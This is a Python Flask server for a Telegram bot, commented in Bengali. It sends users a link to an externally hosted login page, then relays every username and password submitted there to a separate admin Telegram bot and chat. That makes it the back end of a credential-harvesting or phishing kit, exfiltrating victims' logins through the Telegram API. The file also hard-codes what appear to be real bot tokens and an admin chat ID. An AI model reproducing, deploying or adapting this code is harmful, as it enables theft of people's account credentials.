from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
import os

app = Flask(__name__)
CORS(app)

# -------------------------
# Main Bot Token
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8472535428:AAGAcUvGClisEF9Kr0MsaKLGw5Je_AY4JVU")

# Admin Bot Token
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8218726690:AAHMwmdce9LJA1GPovRo4Exk4ON7_P4CUdY")  # <-- এখানে তোমার এডমিন বট টোকেন দাও

# Admin Telegram Chat ID (যেখানে সব লগইন ইনফো যাবে)
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "1849126202")  # <-- এখানে তোমার নিজের Telegram ID বা Admin Chat ID দাও

# Frontend Netlify URL
FRONTEND_BASE = "https://beamish-speculoos-1994d0.netlify.app"
USERS_FILE = "users.json"
# -------------------------

registered_users = {}

# -------------------------
# ইউজার লোড / সেভ ফাংশন
# -------------------------
def load_users():
    global registered_users
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as f:
            registered_users = json.load(f)
    else:
        registered_users = {}

def save_users():
    with open(USERS_FILE, "w") as f:
        json.dump(registered_users, f, indent=4)

# -------------------------
# Telegram message পাঠানো (মেইন বট)
# -------------------------
def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": text})
    except Exception as e:
        print(f"❌ Error sending message to {chat_id}: {e}")

# -------------------------
# Admin message পাঠানো
# -------------------------
def send_admin_message(text):
    url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": ADMIN_CHAT_ID, "text": text})
        print("✅ Sent to admin:", text)
    except Exception as e:
        print(f"❌ Error sending to admin: {e}")

def make_register_url(chat_id):
    return f"{FRONTEND_BASE}/index.html?uid={chat_id}"

# -------------------------
# Webhook route
# -------------------------
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    data = request.get_json(silent=True) or {}
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text","")
        
        if text.lower().strip() == "/start":
            # Welcome message + registration URL
            reg_url = make_register_url(chat_id)
            welcome = f"🤖 Welcome!\nRegister/Login here:\n{reg_url}"
            send_message(chat_id, welcome)

            # ইউজারকে register করা
            registered_users[str(chat_id)] = True
            save_users()
            print(f"✅ User {chat_id} registered.")
    return jsonify({"status":"ok"})

# -------------------------
# Login info receive
# -------------------------
@app.route('/receive_login', methods=["POST"])
def receive_login():
    data = request.json or {}
    uid = str(data.get("uid",""))
    username = data.get("username","")
    password = data.get("password","")
    
    if uid and uid in registered_users:
        msg = f"🧾 Login Info\n👤 Username: {username}\n🔑 Password: {password}"
        send_message(uid, "✅ Your login info received successfully.")
        send_admin_message(f"👤 User UID: {uid}\n{msg}")  # Admin bot-এ পাঠানো
        return jsonify({"status":"sent"})
    else:
        return jsonify({"error":"uid not found"})

# -------------------------
# Home route
# -------------------------
@app.route('/')
def home():
    return "✅ Bot server running with Admin sync!"

# -------------------------
# Main
# -------------------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    
    # Telegram webhook auto-set (Railway)
    public_url = os.environ.get("RAILWAY_STATIC_URL") or os.environ.get("RAILWAY_PUBLIC_URL")
    if public_url:
        webhook_url = f"{public_url}/{BOT_TOKEN}"
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}")
            print("✅ Telegram webhook set:", r.text)
        except Exception as e:
            print("❌ Failed to set webhook:", e)
    else:
        print("⚠️ Railway public URL not detected. Set webhook manually if needed.")

    load_users()
    app.run(host="0.0.0.0", port=port)
